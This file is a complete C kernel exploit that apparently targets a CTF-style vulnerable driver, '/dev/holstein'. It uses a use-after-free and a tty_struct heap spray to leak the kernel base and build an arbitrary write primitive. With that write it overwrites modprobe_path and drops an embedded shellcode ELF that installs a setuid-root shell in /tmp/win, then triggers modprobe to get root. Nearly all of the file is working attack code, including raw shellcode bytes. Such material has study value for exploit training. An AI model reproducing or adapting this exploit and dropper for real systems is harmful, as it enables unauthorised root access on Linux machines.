#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <liburing.h>
#include <pthread.h>

#include <sys/capability.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>

#include <linux/capability.h>
#include <linux/types.h>

#define DEBUG
#define KADDR(addr) ((size_t)(addr) - 0xffffffff81000000 + kernel_base)

#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)

#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

uint64_t user_rip;
uint64_t user_cs;
uint64_t user_rflags;
uint64_t user_rsp;
uint64_t user_ss;

void get_shell()
{
    if (getuid())
    {
        errExit("NO ROOT");
    }

    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    logOK("Got shell!");
    execve(argv[0], argv, envp);
}

void hex_dump(char *buf, size_t size)
{
    for (size_t i = 0; i <= size / 8; i++)
    {
        printf("[+] buf[0x%04lx] -> 0x%016lx\n",
               i * 8,
               *(uint64_t *)&buf[i * 8]);
    }
}

void save_state()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop qword ptr [rip+user_rflags];");
    user_rip = (uint64_t)(uintptr_t)get_shell;
    logInfo("Saved user state - RIP: 0x%lx, CS: 0x%lx, RFLAGS: 0x%lx, RSP: 0x%lx, SS: 0x%lx",
            user_rip, user_cs, user_rflags, user_rsp, user_ss);
}

#define SPRAY_NUM 100
#define ofs_tty_ops 0xc39c60
#define mov_ptr_rdx_rcx_ret (kbase + 0x1b2d06)
#define mov_eax_ptr_rdx_ret (kbase + 0x4469e8)
#define modprobe_path (kbase + 0xe38480)

int _spray[SPRAY_NUM];
int fd1;
int fd2;
int fd3;
int fd4;

uint64_t *buf = NULL;
uint64_t kbase;
uint64_t g_buf;

/*
 * Ref: https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/#version-3-probing-the-mods
 * Dropper...:
 * fd = open("/tmp/win", 0_WRONLY | O_CREAT | O_TRUNC);
 * write(fd, shellcode, shellcodeLen);
 * chmod("/tmp/win", 0x4755);
 * close(fd);
 * exit(0)
 *
 * ... who drops some shellcode ELF:
 * setuid(0);
 * setgid(0);
 * execve("/bin/sh", ["/bin/sh"], NULL);
 */
unsigned char dropper[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x03, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xb0, 0x02, 0x48, 0x8d, 0x3d, 0x3b, 0x00, 0x00,
    0x00, 0xbe, 0x41, 0x02, 0x00, 0x00, 0x0f, 0x05,
    0x48, 0x89, 0xc7, 0x48, 0x8d, 0x35, 0x33, 0x00,
    0x00, 0x00, 0xba, 0xa0, 0x00, 0x00, 0x00, 0xb0,
    0x01, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0xb0, 0x03,
    0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x13, 0x00, 0x00,
    0x00, 0xbe, 0xff, 0x0d, 0x00, 0x00, 0xb0, 0x5a,
    0x0f, 0x05, 0x48, 0x31, 0xff, 0xb0, 0x3c, 0x0f,
    0x05, 0x00, 0x00, 0x00, 0x2f, 0x74, 0x6d, 0x70,
    0x2f, 0x77, 0x69, 0x6e, 0x00, 0x7f, 0x45, 0x4c,
    0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x3e,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff,
    0xb0, 0x69, 0x0f, 0x05, 0x48, 0x31, 0xff, 0xb0,
    0x6a, 0x0f, 0x05, 0x48, 0xbb, 0xd1, 0x9d, 0x96,
    0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb,
    0x53, 0x48, 0x89, 0xe7, 0x56, 0x57, 0x48, 0x89,
    0xe6, 0xb0, 0x3b, 0x0f, 0x05};

void leak()
{
    logInfo("UAF: open fd1, fd2; close fd1");
    fd1 = open("/dev/holstein", O_RDWR);
    fd2 = open("/dev/holstein", O_RDWR);
    if (fd1 < 0 || fd2 < 0) errExit("open");
    close(fd1); // kfree(g_buf)

    logInfo("Spray %d tty_struct objects", SPRAY_NUM / 2);
    for (int i = 0; i < SPRAY_NUM / 2; i++)
    {
        _spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (_spray[i] < 0)
            errExit("open ptmx");
    }

    logInfo("Leaking kbase and gbuf from fd2");
    buf = calloc(0x400, sizeof(uint64_t));
    if (!buf)
        errExit("calloc");
    read(fd2, buf, 0x400); // read tty_struct
    // hex_dump((char *)buf, 0x400);

    kbase = buf[0x18 / 8] - ofs_tty_ops;
    g_buf = buf[0x38 / 8] - 0x38;

    logOK("Kernel base: 0x%lx", kbase);
    logOK("g_buf: 0x%lx", g_buf);
}

int cache_fd = -1;
void AAW32(uint64_t addr, uint64_t val)
{
    logInfo("AAW: writing 0x%x at 0x%lx", val, addr);
    if (cache_fd == -1)
    {
        read(fd4, buf, 0x400);
        buf[0x18 / 8] = g_buf + 0x3f8 - (12 * 8); // fake tty_ops
        write(fd4, buf, 0x20);

        for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++)
        {
            int v = ioctl(_spray[i], val /* rcx */, addr /* rdx */);
            if (v != -1)
            {
                logInfo("Target tty_struct index: #%d", i);
                cache_fd = _spray[i];
                break;
            }
        }
    }
    else {
        ioctl(cache_fd, val, addr);
    }
}

void pwn() {
    buf[0x3f8 / 8] = mov_ptr_rdx_rcx_ret; // fake ioctl ops
    write(fd2, buf, 0x400);

    logInfo("UAF: open fd3, fd4; close fd3");
    fd3 = open("/dev/holstein", O_RDWR);
    fd4 = open("/dev/holstein", O_RDWR);
    if (fd3 < 0 || fd4 < 0)
        errExit("open");
    close(fd3); // kfree(g_buf)

    logInfo("Spray %d tty_struct objects", SPRAY_NUM / 2);
    for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++)
    {
        _spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (_spray[i] == -1)
            perror("open");
    }

    char write_modprobe[] = "/tmp/evil";
    for (size_t i = 0; i < sizeof(write_modprobe); i += 4)
    {
        AAW32(modprobe_path + i, *(uint32_t *)&write_modprobe[i]);
    }

    logInfo("Writing /tmp/evil dropper");
    FILE *f = fopen("/tmp/evil", "w");
    if (!f) {
        logErr("Failed to open /tmp/evil");
    }

    if (fwrite(dropper, sizeof(dropper), 1, f) != 1) {
        logErr("Failed to write dropper to /tmp/evil");
    }
    fclose(f);

    logInfo("Trigger modprobe_path");
    system("chmod +x /tmp/evil");
    system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
    system("chmod +x /tmp/trigger");
    system("/tmp/trigger"); // trigger modprobe

    logInfo("Getting root shell...");
    system("/tmp/win");

    WAIT(); // for not immediate exit the process

}

int main(int argc, char **argv, char **envp)
{
    leak();
    pwn();
    return 0;
}
